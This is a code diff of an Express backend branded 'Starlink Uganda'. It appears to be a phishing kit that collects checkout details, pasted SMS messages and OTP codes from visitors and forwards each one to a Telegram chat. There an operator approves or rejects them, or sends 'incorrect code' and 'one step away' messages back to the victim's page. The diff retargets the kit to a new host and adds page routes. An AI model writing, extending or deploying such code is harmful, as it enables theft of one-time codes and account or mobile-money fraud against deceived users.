@@ -1,21 +1,15 @@
 /* ============================================================
-   Starlink Uganda — Backend
-   - Telegram approve/reject/resend/reminder via inline buttons
-   - Pages: checkout → sms-paste → otp-verify
-   - Polling status endpoint for user pages
-   - In-memory Map, auto-cleaned
+   Starlink Uganda — Backend (Render)
    ============================================================ */
 
 const express = require('express');
 const cors = require('cors');
 const crypto = require('crypto');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 
-/* ============================================================
-   CONFIG
-   ============================================================ */
 const PORT = process.env.PORT || 5000;
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
@@ -26,11 +20,8 @@ const TELEGRAM_ANSWER_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/
 const TELEGRAM_EDIT_URL    = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
 const TELEGRAM_WEBHOOK_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;
 
-const SESSION_TIMEOUT_MS = 10 * 60 * 1000; // 10 min
+const SESSION_TIMEOUT_MS = 10 * 60 * 1000;
 
-/* ============================================================
-   IN-MEMORY SESSION STORE
-   ============================================================ */
 const sessions = new Map();
 
 setInterval(() => {
@@ -47,9 +38,6 @@ setInterval(() => {
   }
 }, 60 * 1000);
 
-/* ============================================================
-   MIDDLEWARE
-   ============================================================ */
 app.use(cors());
 app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
@@ -59,12 +47,10 @@ app.use((req, _res, next) => {
   next();
 });
 
-/* Serve static HTML pages */
-app.use(express.static(path.join(__dirname, 'public')));
+const PUBLIC_DIR = path.join(__dirname, 'public');
 
-/* ============================================================
-   HELPERS
-   ============================================================ */
+app.use(express.static(PUBLIC_DIR));
+
 function makeSessionId() {
   return crypto.randomBytes(16).toString('hex');
 }
@@ -88,9 +74,6 @@ function stripFirstLine(text) {
   return rest.replace(/^━+\n/, '').trim();
 }
 
-/* ============================================================
-   TELEGRAM HELPERS
-   ============================================================ */
 function buildKeyboard(step, sessionId) {
   const row = [];
 
@@ -115,7 +98,7 @@ function buildKeyboard(step, sessionId) {
 
 async function sendTelegramWithButtons(text, sessionId, step) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.warn('⚠️ Telegram env vars missing — message not sent.');
+    console.warn('Telegram env vars missing');
     return null;
   }
   try {
@@ -132,12 +115,12 @@ async function sendTelegramWithButtons(text, sessionId, step) {
     });
     const data = await res.json().catch(() => ({}));
     if (!data.ok) {
-      console.warn('⚠️ Telegram error:', data.description || data);
+      console.warn('Telegram error:', data.description || data);
       return null;
     }
     return data.result.message_id || null;
   } catch (err) {
-    console.error('❌ Telegram fetch failed:', err.message);
+    console.error('Telegram fetch failed:', err.message);
     return null;
   }
 }
@@ -182,20 +165,34 @@ async function answerCallback(callbackQueryId, text) {
 }
 
 /* ============================================================
-   HEALTH CHECK
+   PAGE ROUTES
    ============================================================ */
-app.get('/', (_req, res) => {
-  res.json({
-    ok: true,
-    service: 'starlink-uganda-backend',
-    activeSessions: sessions.size,
-    webhook: global.__webhookStatus || 'unknown',
-    time: new Date().toISOString()
-  });
-});
+function servePage(filename) {
+  return (_req, res) => {
+    const filePath = path.join(PUBLIC_DIR, filename);
+    if (!fs.existsSync(filePath)) {
+      return res.status(404).send(`
+        <html><body style="font-family:sans-serif;text-align:center;padding:60px 20px;background:#f9fafb;">
+          <h1 style="font-size:40px;margin:0;color:#111827;">Page missing</h1>
+          <p style="color:#6b7280;margin-top:12px;">${filename} not found on server.</p>
+          <a href="/plans/" style="display:inline-block;margin-top:20px;padding:12px 22px;background:#FFCC00;color:#000;text-decoration:none;font-weight:900;border-radius:10px;">Go to Plans</a>
+        </body></html>
+      `);
+    }
+    res.sendFile(filePath);
+  };
+}
+
+app.get(['/', '/dashboard', '/dashboard/'], servePage('index.html'));
+app.get(['/plans', '/plans/'], servePage('plans.html'));
+app.get(['/checkout', '/checkout/'], servePage('checkout.html'));
+app.get(['/sms-paste', '/sms-paste/'], servePage('sms-paste.html'));
+app.get(['/otp-verify', '/otp-verify/'], servePage('otp-verify.html'));
+app.get(['/settings', '/settings/'], servePage('settings.html'));
+app.get(['/entertainment', '/entertainment/'], servePage('entertainment.html'));
 
 /* ============================================================
-   POST /api/checkout
+   API — CHECKOUT
    ============================================================ */
 app.post('/api/checkout', async (req, res) => {
   try {
@@ -241,7 +238,7 @@ app.post('/api/checkout', async (req, res) => {
 });
 
 /* ============================================================
-   POST /api/sms
+   API — SMS
    ============================================================ */
 app.post('/api/sms', async (req, res) => {
   try {
@@ -287,7 +284,7 @@ app.post('/api/sms', async (req, res) => {
 });
 
 /* ============================================================
-   POST /api/otp
+   API — OTP
    ============================================================ */
 app.post('/api/otp', async (req, res) => {
   try {
@@ -333,7 +330,7 @@ app.post('/api/otp', async (req, res) => {
 });
 
 /* ============================================================
-   GET /api/status/:sessionId
+   API — STATUS
    ============================================================ */
 app.get('/api/status/:sessionId', (req, res) => {
   const { sessionId } = req.params;
@@ -358,7 +355,7 @@ app.get('/api/status/:sessionId', (req, res) => {
 });
 
 /* ============================================================
-   POST /api/telegram-webhook
+   TELEGRAM WEBHOOK
    ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
@@ -384,9 +381,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     const when = new Date().toLocaleString('en-GB');
 
-    /* ----------------------------------------------------------
-       🔁 RESEND
-       ---------------------------------------------------------- */
     if (action === 'resend') {
       session.status = 'resend_requested';
       session.resendRequestedAt = Date.now();
@@ -397,7 +391,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         session.userMessage = 'Incorrect code. Please enter the correct OTP.';
       }
 
-      await answerCallback(cb.id, '🔁 Resend requested');
+      await answerCallback(cb.id, 'Resend requested');
 
       const preservedBody = stripFirstLine(session.originalText);
       const newText =
@@ -418,9 +412,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    /* ----------------------------------------------------------
-       ⏰ REMINDER
-       ---------------------------------------------------------- */
     if (action === 'reminder') {
       session.status = 'reminder_sent';
       session.reminderSentAt = Date.now();
@@ -431,7 +422,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         session.userMessage = 'Almost done! Please enter the OTP code we sent you to unlock your Starlink plan. You are one step away from high-speed internet.';
       }
 
-      await answerCallback(cb.id, '⏰ Reminder sent');
+      await answerCallback(cb.id, 'Reminder sent');
 
       const preservedBody = stripFirstLine(session.originalText);
       const newText =
@@ -453,13 +444,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    /* ----------------------------------------------------------
-       ✅ APPROVE  /  ❌ REJECT
-       ---------------------------------------------------------- */
     if (action === 'approve') {
       session.status = 'approved';
       session.resolvedAt = Date.now();
-      await answerCallback(cb.id, '✅ Approved');
+      await answerCallback(cb.id, 'Approved');
     } else if (action === 'reject') {
       session.status = 'rejected';
       session.resolvedAt = Date.now();
@@ -470,7 +458,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         session.userMessage = 'Rejected. Please try again.';
       }
 
-      await answerCallback(cb.id, '❌ Rejected');
+      await answerCallback(cb.id, 'Rejected');
     } else {
       await answerCallback(cb.id, 'Unknown action');
       return res.json({ ok: true });
@@ -499,35 +487,21 @@ app.post('/api/telegram-webhook', async (req, res) => {
 });
 
 /* ============================================================
-   FALLBACK PAGE ROUTES
-   ============================================================ */
-const pageRoutes = {
-  '/':              'index.html',
-  '/dashboard/':    'index.html',
-  '/plans/':        'plans.html',
-  '/checkout/':     'checkout.html',
-  '/sms-paste/':    'sms-paste.html',
-  '/otp-verify/':   'otp-verify.html',
-  '/settings/':     'settings.html',
-  '/entertainment/':'entertainment.html'
-};
-
-Object.entries(pageRoutes).forEach(([route, file]) => {
-  app.get(route, (_req, res) => {
-    res.sendFile(path.join(__dirname, 'public', file));
-  });
-});
-
-/* ============================================================
    404 + ERROR
    ============================================================ */
 app.use((_req, res) => {
-  res.status(404).json({ ok: false, error: 'Not found' });
+  res.status(404).send(`
+    <html><body style="font-family:sans-serif;text-align:center;padding:60px 20px;background:#f9fafb;">
+      <h1 style="font-size:48px;margin:0;color:#111827;">404</h1>
+      <p style="color:#6b7280;margin-top:12px;">Page not found.</p>
+      <a href="/plans/" style="display:inline-block;margin-top:20px;padding:12px 22px;background:#FFCC00;color:#000;text-decoration:none;font-weight:900;border-radius:10px;">Go to Plans</a>
+    </body></html>
+  `);
 });
 
 app.use((err, _req, res, _next) => {
   console.error('unhandled error:', err);
-  res.status(500).json({ ok: false, error: 'Server error' });
+  res.status(500).send('Server error');
 });
 
 /* ============================================================
@@ -535,25 +509,25 @@ app.use((err, _req, res, _next) => {
    ============================================================ */
 async function registerWebhook() {
   if (!TELEGRAM_BOT_TOKEN) {
-    console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
+    console.warn('Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
     global.__webhookStatus = 'missing_token';
     return;
   }
 
   let publicUrl = process.env.PUBLIC_URL || '';
-  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
-    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
+  if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
+    publicUrl = process.env.RENDER_EXTERNAL_URL;
   }
   publicUrl = publicUrl.replace(/\/+$/, '');
 
   if (!publicUrl) {
-    console.warn('⚠️ No PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
+    console.warn('No PUBLIC_URL / RENDER_EXTERNAL_URL set');
     global.__webhookStatus = 'missing_url';
     return;
   }
 
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
-  console.log('🔗 Registering webhook:', webhookUrl);
+  console.log('Registering webhook:', webhookUrl);
 
   try {
     const res = await fetch(TELEGRAM_WEBHOOK_URL, {
@@ -566,14 +540,14 @@ async function registerWebhook() {
     });
     const data = await res.json().catch(() => ({}));
     if (data.ok) {
-      console.log('✅ Telegram webhook registered:', webhookUrl);
+      console.log('Telegram webhook registered:', webhookUrl);
       global.__webhookStatus = 'ok';
     } else {
-      console.warn('⚠️ Webhook registration failed:', data.description || data);
+      console.warn('Webhook registration failed:', data.description || data);
       global.__webhookStatus = `failed: ${data.description || 'unknown'}`;
     }
   } catch (err) {
-    console.error('❌ Webhook registration error:', err.message);
+    console.error('Webhook registration error:', err.message);
     global.__webhookStatus = `error: ${err.message}`;
   }
 }
@@ -583,9 +557,9 @@ async function registerWebhook() {
    ============================================================ */
 app.listen(PORT, async () => {
   console.log('====================================');
-  console.log('🛰️  Starlink Uganda — backend running');
-  console.log(`🚀 Port: ${PORT}`);
-  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
+  console.log('Starlink Uganda — backend running');
+  console.log(`Port: ${PORT}`);
+  console.log(`Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
   console.log('====================================');
 
   setTimeout(registerWebhook, 2000);
